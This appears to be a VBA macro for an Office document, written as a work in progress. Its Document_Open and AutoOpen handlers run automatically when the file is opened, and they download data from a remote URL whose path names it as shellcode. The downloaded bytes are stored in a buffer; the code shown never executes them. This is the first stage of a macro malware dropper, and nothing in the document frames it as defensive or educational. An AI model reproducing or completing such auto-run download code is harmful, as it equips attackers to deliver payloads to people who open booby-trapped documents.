' Seems to work

Sub Document_Open() 
    TargetMacro
End Sub
Sub AutoOpen() 
    TargetMacro
End Sub
Sub TargetMacro()
    DownloadFile
End Sub



Sub DownloadFile()
    Dim URL As String
    URL = "https://www.infinity-bank.com/shellcode/bhttp"

    Dim xhr As Object
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", URL, False
    xhr.send

    If xhr.Status = 200 Then
        ' Save the response in a Variant array
        Dim buf As Variant
        buf = xhr.responseBody

        ' The Variant array now contains the file content

    Else
        MsgBox "Failed to download file. Status: " & xhr.Status & " " & xhr.statusText
    End If
End Sub
